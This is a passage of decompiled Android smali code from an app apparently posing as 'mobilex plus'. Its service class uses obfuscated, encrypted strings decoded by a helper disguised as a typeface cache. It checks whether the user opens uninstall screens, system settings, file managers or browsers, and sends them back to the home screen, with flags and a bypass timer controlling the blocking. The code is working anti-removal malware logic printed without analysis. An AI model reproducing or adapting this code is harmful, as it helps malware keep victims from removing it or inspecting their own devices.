    move-result-object v5

    .line 128
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 129
    .line 130
    .line 131
    move-result v5

    .line 132
    if-nez v5, :cond_5

    .line 133
    .line 134
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 135
    .line 136
    .line 137
    move-result-object v5

    .line 138
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 139
    .line 140
    .line 141
    move-result v5

    .line 142
    if-eqz v5, :cond_7

    .line 143
    .line 144
    :cond_5
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 145
    .line 146
    if-eqz v0, :cond_6

    .line 147
    .line 148
    goto/16 :goto_4

    .line 149
    .line 150
    :cond_6
    const-string v0, "00180051006E00A600C2009B00EF00E7000000790054008B00F400B000C500A900630064005E00CA00F200B300DD00A4002800360052008900E300AB00D300AB002F0073004900DD00B0"

    .line 151
    .line 152
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 153
    .line 154
    .line 155
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 156
    .line 157
    .line 158
    return-void

    nop

    nop

    .line 159
    :cond_7
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    .line 160
    .line 161
    if-eqz v5, :cond_c

    .line 162
    .line 163
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 164
    .line 165
    .line 166
    move-result-object v5

    .line 167
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 168
    .line 169
    .line 170
    move-result v5

    .line 171
    if-nez v5, :cond_8

    .line 172
    .line 173
    invoke-static {v8}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 174
    .line 175
    .line 176
    move-result-object v5

    .line 177
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 178
    .line 179
    .line 180
    move-result v5

    .line 181
    if-eqz v5, :cond_c

    nop

    .line 182
    .line 183
    :cond_8
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 184
    .line 185
    if-eqz v0, :cond_9

    nop

    nop

    .line 186
    .line 187
    goto/16 :goto_4

    .line 188
    .line 189
    :cond_9
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 190
    .line 191
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    .line 192
    .line 193
    if-eqz v0, :cond_a

    .line 194
    .line 195
    goto/16 :goto_4

    .line 196
    .line 197
    :cond_a
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 198
    .line 199
    .line 200
    move-result-wide v2

    .line 201
    sget-wide v4, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 202
    .line 203
    cmp-long v0, v2, v4

    .line 204
    .line 205
    if-gez v0, :cond_b

    .line 206
    .line 207
    goto/16 :goto_4

    .line 208
    .line 209
    :cond_b
    const-string v0, "00180051006E00A600C2009B00EF00E70001007A0054008400FB00BA00D600E7003300770058008C00F100B800D700AE002D0065004F008600FC00B300D700B500790036"

    .line 210
    .line 211
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 212
    .line 213
    .line 214
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 215
    .line 216
    .line 217
    return-void

    .line 218
    :cond_c
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    .line 219
    .line 220
    if-eqz v5, :cond_14

    .line 221
    .line 222
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C0094"

    .line 223
    .line 224
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 225
    .line 226
    .line 227
    move-result-object v5

    .line 228
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 229
    .line 230
    .line 231
    move-result v5

    .line 232
    if-nez v5, :cond_e

    .line 233
    .line 234
    const-string v5, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C0094"

    .line 235
    .line 236
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 237
    .line 238
    .line 239
    move-result-object v5

    nop

    nop

    .line 240
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 241
    .line 242
    .line 243
    move-result v5

    .line 244
    if-nez v5, :cond_e

    .line 245
    .line 246
    const-string v5, "00200079005600C900EA00AB00D700E9"

    .line 247
    .line 248
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 249
    .line 250
    .line 251
    move-result-object v5

    .line 252
    invoke-virtual {v3, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    .line 253
    .line 254
    .line 255
    move-result v5

    .line 256
    if-eqz v5, :cond_d

    .line 257
    .line 258
    const-string v5, "00300073004F009300F900B100D5"

    .line 259
    .line 260
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 261
    .line 262
    .line 263
    move-result-object v5

    .line 264
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 265
    .line 266
    .line 267
    move-result v5

    .line 268
    if-nez v5, :cond_e

    .line 269
    .line 270
    :cond_d
    const-string v5, "00200079005600C900FD00B600C700AE006D0065005E008400E500AD00DB00B3003A0075005E008900E400BA00C0"

    .line 271
    .line 272
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 273
    .line 274
    .line 275
    move-result-object v5

    .line 276
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 277
    .line 278
    .line 279
    move-result v5

    .line 280
    if-nez v5, :cond_e

    .line 281
    .line 282
    const-string v5, "00200079005600C900F300B000DE00A800310079004800C900E300BE00D400A2002000730055009300F500AD"

    .line 283
    .line 284
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 285
    .line 286
    .line 287
    move-result-object v5

    .line 288
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 289
    .line 290
    .line 291
    move-result v5

    .line 292
    if-nez v5, :cond_e

    .line 293
    .line 294
    const-string v5, "00200079005600C900FF00AF00DE00B2003000380048008600F600BA00D100A2002D0062005E0095"

    .line 295
    .line 296
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 297
    .line 298
    .line 299
    move-result-object v5

    .line 300
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 301
    .line 302
    .line 303
    move-result v5

    .line 304
    if-nez v5, :cond_e

    .line 305
    .line 306
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900E000AD00DD00B1002A0072005E009500E300F100C100A2003700620052008900F700AC"

    .line 307
    .line 308
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 309
    .line 310
    .line 311
    move-result-object v5

    .line 312
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 313
    .line 314
    .line 315
    move-result v5

    .line 316
    if-nez v5, :cond_e

    .line 317
    .line 318
    const-string v5, "00300073004F009300F900B100D500B4"

    .line 319
    .line 320
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 321
    .line 322
    .line 323
    move-result-object v5

    nop

    nop

    .line 324
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 325
    .line 326
    .line 327
    move-result v5

    .line 328
    if-eqz v5, :cond_14

    .line 329
    .line 330
    const-string v5, "003300730049008A00F900AC00C100AE002C00780058008800FE00AB00C000A8002F007A005E0095"

    .line 331
    .line 332
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 333
    .line 334
    .line 335
    move-result-object v5

    .line 336
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 337
    .line 338
    .line 339
    move-result v5

    .line 340
    if-nez v5, :cond_14

    nop

    nop

    .line 341
    .line 342
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 343
    .line 344
    .line 345
    move-result-object v5

    .line 346
    invoke-static {v3, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 347
    .line 348
    .line 349
    move-result v5

    .line 350
    if-nez v5, :cond_14

    .line 351
    .line 352
    :cond_e
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingForceStop:Ljava/lang/String;

    .line 353
    .line 354
    if-eqz v0, :cond_f

    .line 355
    .line 356
    goto/16 :goto_4

    .line 357
    .line 358
    :cond_f
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 359
    .line 360
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    .line 361
    .line 362
    if-eqz v0, :cond_10

    .line 363
    .line 364
    goto/16 :goto_4

    .line 365
    .line 366
    :cond_10
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    .line 367
    .line 368
    if-eqz v0, :cond_11

    .line 369
    .line 370
    goto/16 :goto_4

    nop

    nop

    .line 371
    .line 372
    :cond_11
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 373
    .line 374
    .line 375
    move-result-wide v2

    .line 376
    sget-wide v4, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 377
    .line 378
    cmp-long v0, v2, v4

    .line 379
    .line 380
    if-gez v0, :cond_12

    nop

    .line 381
    .line 382
    goto/16 :goto_4

    .line 383
    .line 384
    :cond_12
    sget-wide v2, Lapp/mobilex/plus/services/DataQFAdapter;->serviceStartTime:J

    .line 385
    .line 386
    const-wide/16 v4, 0x0

    .line 387
    .line 388
    cmp-long v0, v2, v4

    .line 389
    .line 390
    if-lez v0, :cond_13

    .line 391
    .line 392
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 393
    .line 394
    .line 395
    move-result-wide v2

    .line 396
    sget-wide v4, Lapp/mobilex/plus/services/DataQFAdapter;->serviceStartTime:J

    .line 397
    .line 398
    sub-long/2addr v2, v4

    .line 399
    const-wide/32 v4, 0xea60

    .line 400
    .line 401
    .line 402
    cmp-long v0, v2, v4

    .line 403
    .line 404
    if-gez v0, :cond_13

    .line 405
    .line 406
    goto/16 :goto_4

    .line 407
    .line 408
    :cond_13
    const-string v0, "00180051006E00A600C2009B00EF00E700100073004F009300F900B100D500B400630077004B009700B000BD00DE00A80020007D005E008300AA00FF"

    .line 409
    .line 410
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 411
    .line 412
    .line 413
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 414
    .line 415
    .line 416
    return-void

    .line 417
    :cond_14
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    .line 418
    .line 419
    if-eqz v5, :cond_15

    .line 420
    .line 421
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900E000AD00DD00B1002A0072005E009500E300F100D600A8003400780057008800F100BB00C100E90036007F"

    .line 422
    .line 423
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 424
    .line 425
    .line 426
    move-result-object v5

    .line 427
    const-string v7, "00200079005600C900F100B100D600B5002C007F005F00C900E000AD00DD00B1002A0072005E009500E300F100D600A8003400780057008800F100BB00C1"

    .line 428
    .line 429
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 430
    .line 431
    .line 432
    move-result-object v7

    .line 433
    const-string v9, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008300FF00BC00C700AA00260078004F009400E500B6"

    .line 434
    .line 435
    invoke-static {v9}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 436
    .line 437
    .line 438
    move-result-object v9

    .line 439
    const-string v10, "00200079005600C900F100B100D600B5002C007F005F00C900F400B000D100B2002E00730055009300E300AA00DB"

    nop

    .line 440
    .line 441
    invoke-static {v10}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 442
    .line 443
    .line 444
    move-result-object v10

    .line 445
    filled-new-array {v5, v7, v9, v10}, [Ljava/lang/String;

    .line 446
    .line 447
    .line 448
    move-result-object v5

    .line 449
    invoke-static {v5}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 450
    .line 451
    .line 452
    move-result-object v5

    .line 453
    invoke-interface {v5, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 454
    .line 455
    .line 456
    move-result v5

    .line 457
    if-eqz v5, :cond_15

    .line 458
    .line 459
    const-string v0, "00180051006E00A600C2009B00EF00E700070079004C008900FC00B000D300A30063007B005A008900F100B800D700B5006300740057008800F300B400D700A300790036"

    .line 460
    .line 461
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 462
    .line 463
    .line 464
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 465
    .line 466
    .line 467
    return-void

    .line 468
    :cond_15
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Browser:Z

    .line 469
    .line 470
    const-string v7, "002A00780048009300F100B300DE"

    nop

    .line 471
    .line 472
    if-eqz v5, :cond_17

    .line 473
    .line 474
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900F300B700C000A8002E0073"

    .line 475
    .line 476
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 477
    .line 478
    .line 479
    move-result-object v9

    .line 480
    const-string v5, "00200079005600C900F300B700C000A8002E00730015008500F500AB00D3"

    .line 481
    .line 482
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 483
    .line 484
    .line 485
    move-result-object v10

    .line 486
    const-string v5, "00200079005600C900F300B700C000A8002E00730015008300F500A9"

    .line 487
    .line 488
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 489
    .line 490
    .line 491
    move-result-object v11

    .line 492
    const-string v5, "00200079005600C900E300BA00D100E900220078005F009500FF00B600D600E900220066004B00C900E300BD00C000A800340065005E0095"

    .line 493
    .line 494
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 495
    .line 496
    .line 497
    move-result-object v12

    .line 498
    const-string v5, "00200079005600C900FF00AF00D700B5002200380059009500FF00A800C100A20031"

    .line 499
    .line 500
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 501
    .line 502
    .line 503
    move-result-object v13

    .line 504
    const-string v5, "00200079005600C900FF00AF00D700B5002200380056008E00FE00B6009C00A9002200620052009100F5"

    .line 505
    .line 506
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 507
    .line 508
    .line 509
    move-result-object v14

    nop

    nop

    .line 510
    const-string v5, "002C0064005C00C900FD00B000C800AE002F007A005A00C900F600B600C000A2002500790043"

    .line 511
    .line 512
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 513
    .line 514
    .line 515
    move-result-object v15

    .line 516
    const-string v5, "00200079005600C900F200AD00D300B1002600380059009500FF00A800C100A20031"

    .line 517
    .line 518
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 519
    .line 520
    .line 521
    move-result-object v16

    .line 522
    const-string v5, "00200079005600C900FD00B600D100B5002C00650054008100E400F100D700AA002E006E"

    .line 523
    .line 524
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 525
    .line 526
    .line 527
    move-result-object v17

    .line 528
    const-string v5, "00200079005600C900E900BE00DC00A30026006E0015008500E200B000C500B400260064"

    .line 529
    .line 530
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 531
    .line 532
    .line 533
    move-result-object v18

    .line 534
    const-string v5, "00200079005600C900C5009C00FF00A80021007F0057008200BE00B600DC00B3002F"

    nop

    nop

    .line 535
    .line 536
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 537
    .line 538
    .line 539
    move-result-object v19

    .line 540
    const-string v5, "00200079005600C900C5009C00FF00A80021007F00570082"

    .line 541
    .line 542
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 543
    .line 544
    .line 545
    move-result-object v20

    .line 546
    const-string v5, "00200079005600C900E600B600C400A6002F0072005200C900F200AD00DD00B0003000730049"

    .line 547
    .line 548
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 549
    .line 550
    .line 551
    move-result-object v21

    .line 552
    const-string v5, "00200079005600C900F400AA00D100AC002700630058008C00F700B0009C00AA002C00740052008B00F500F100D300A9002700640054008E00F4"

    .line 553
    .line 554
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 555
    .line 556
    .line 557
    move-result-object v22

    .line 558
    filled-new-array/range {v9 .. v22}, [Ljava/lang/String;

    .line 559
    .line 560
    .line 561
    move-result-object v5

    .line 562
    invoke-static {v5}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 563
    .line 564
    .line 565
    move-result-object v5

    nop

    .line 566
    invoke-interface {v5, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 567
    .line 568
    .line 569
    move-result v5

    .line 570
    if-eqz v5, :cond_17

    nop

    .line 571
    .line 572
    const-string v5, "00270079004C008900FC00B000D300A3"

    .line 573
    .line 574
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 575
    .line 576
    .line 577
    move-result-object v5

    .line 578
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 579
    .line 580
    .line 581
    move-result v5

    .line 582
    if-nez v5, :cond_16

    .line 583
    .line 584
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 585
    .line 586
    .line 587
    move-result-object v5

    .line 588
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 589
    .line 590
    .line 591
    move-result v5

    .line 592
    if-eqz v5, :cond_17

    .line 593
    .line 594
    :cond_16
    const-string v0, "00180051006E00A600C2009B00EF00E7000100640054009000E300BA00C000E700270079004C008900FC00B000D300A3006C007F0055009400E400BE00DE00AB006300740057008800F300B400D700A300790036"

    .line 595
    .line 596
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 597
    .line 598
    .line 599
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 600
    .line 601
    .line 602
    return-void

    .line 603
    :cond_17
    const-string v5, "002C0064005C00C900E400BA00DE00A200240064005A008A00BE00B200D700B4003000730055008000F500AD"

    .line 604
    .line 605
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 606
    .line 607
    .line 608
    move-result-object v5

    nop

    nop

    .line 609
    const-string v9, "00200079005600C900E700B700D300B300300077004B0097"

    .line 610
    .line 611
    invoke-static {v9}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 612
    .line 613
    .line 614
    move-result-object v9

    .line 615
    const-string v10, "00200079005600C900E700B700D300B300300077004B009700BE00A8008600A5"

    .line 616
    .line 617
    invoke-static {v10}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 618
    .line 619
    .line 620
    move-result-object v10

    .line 621
    const-string v11, "00200079005600C900E600B600D000A200310038004D008800F900AF"

    nop

    .line 622
    .line 623
    invoke-static {v11}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 624
    .line 625
    .line 626
    move-result-object v11

    .line 627
    const-string v12, "00200079005600C900F600BE00D100A2002100790054008C00BE00B000C000A40022"

    .line 628
    .line 629
    invoke-static {v12}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 630
    .line 631
    .line 632
    move-result-object v12

    .line 633
    filled-new-array {v5, v9, v10, v11, v12}, [Ljava/lang/String;

    .line 634
    .line 635
    .line 636
    move-result-object v5

    .line 637
    invoke-static {v5}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 638
    .line 639
    .line 640
    move-result-object v5

    .line 641
    invoke-interface {v5, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 642
    .line 643
    .line 644
    move-result v5

    nop

    nop

    .line 645
    if-eqz v5, :cond_18

    .line 646
    .line 647
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 648
    .line 649
    .line 650
    move-result-object v5

    .line 651
    invoke-static {v0, v5, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 652
    .line 653
    .line 654
    move-result v5

    .line 655
    if-eqz v5, :cond_18

    .line 656
    .line 657
    const-string v0, "00180051006E00A600C2009B00EF00E7000E00730048009400F500B100D500A2003100360052008900E300AB00D300AB002F00360052008900E400BA00DC00B3006300740057008800F300B400D700A300790036"

    .line 658
    .line 659
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 660
    .line 661
    .line 662
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 663
    .line 664
    .line 665
    return-void

    .line 666
    :cond_18
    sget-boolean v5, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    .line 667
    .line 668
    if-eqz v5, :cond_19

    nop

    nop

    .line 669
    .line 670
    const-string v5, "00390062005E00C900F300B000DF00E9002000780015008100F900B300D700B5"

    nop

    nop

    .line 671
    .line 672
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 673
    .line 674
    .line 675
    move-result-object v9

    .line 676
    const-string v5, "002000780015008900E500BD00DB00A6006D00700052008B00F500B200D300A900220071005E0095"

    .line 677
    .line 678
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 679
    .line 680
    .line 681
    move-result-object v10

    .line 682
    const-string v5, "00200079005600C900E400AD00D300A9003000650052008800FE00F100D400AE002F00730056008600FE00BE00D500A20031"

    .line 683
    .line 684
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 685
    .line 686
    .line 687
    move-result-object v11

    .line 688
    const-string v5, "00200079005600C900E800B000C100E90025007F0057008200FD00BE00DC00A6002400730049"

    .line 689
    .line 690
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 691
    .line 692
    .line 693
    move-result-object v12

    .line 694
    const-string v5, "00200079005600C900FD00B6009C00A6002D00720049008800F900BB009C00A0002F00790059008600FC00B900DB00AB002600730043009700FC00B000C000A20031"

    .line 695
    .line 696
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 697
    .line 698
    .line 699
    move-result-object v13

    .line 700
    const-string v5, "00200079005600C900F300B000DE00A800310079004800C900F600B600DE00A2002E00770055008600F700BA00C0"

    .line 701
    .line 702
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 703
    .line 704
    .line 705
    move-result-object v14

    .line 706
    const-string v5, "00200079005600C900FF00AF00C200A8006D00700052008B00F500B200D300A900220071005E0095"

    .line 707
    .line 708
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 709
    .line 710
    .line 711
    move-result-object v15

    .line 712
    const-string v5, "00200079005600C900E300BA00D100E900220078005F009500FF00B600D600E900220066004B00C900FD00A600D400AE002F00730048"

    .line 713
    .line 714
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 715
    .line 716
    .line 717
    move-result-object v16

    .line 718
    const-string v5, "00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FD00A600D400AE002F00730048"

    .line 719
    .line 720
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 721
    .line 722
    .line 723
    move-result-object v17

    .line 724
    const-string v5, "00200079005600C900F800AA00D300B00026007F0015008F00F900BB00DB00B40028"

    .line 725
    .line 726
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 727
    .line 728
    .line 729
    move-result-object v18

    .line 730
    const-string v5, "00200079005600C900F100AC00C700B4006D00700052008B00F500B200D300A900220071005E0095"

    .line 731
    .line 732
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 733
    .line 734
    .line 735
    move-result-object v19

    .line 736
    const-string v5, "00200079005600C900E200B700DF00B4002C0070004F00C900F600B2"

    .line 737
    .line 738
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 739
    .line 740
    .line 741
    move-result-object v20

    .line 742
    const-string v5, "00200079005600C900FC00B000DC00A2002F006F0058008600E400B800D300AA002600650015009F00E000B300DD00B50026"

    .line 743
    .line 744
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 745
    .line 746
    .line 747
    move-result-object v21

    .line 748
